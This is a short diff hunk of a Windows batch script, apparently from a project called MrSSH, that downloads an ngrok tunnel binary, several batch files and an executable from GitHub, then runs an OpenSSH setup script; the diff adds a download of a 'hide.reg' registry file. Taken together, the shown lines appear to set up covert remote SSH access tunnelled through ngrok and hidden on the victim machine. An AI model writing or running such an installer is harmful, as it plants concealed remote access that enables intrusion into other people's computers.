@@ -10,6 +10,7 @@ curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Hex.bat" -o "Hex.bat"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/hide.reg" -o "hide.reg"
 :: </Install>
 
 powershell ./OpenSSH.ps1
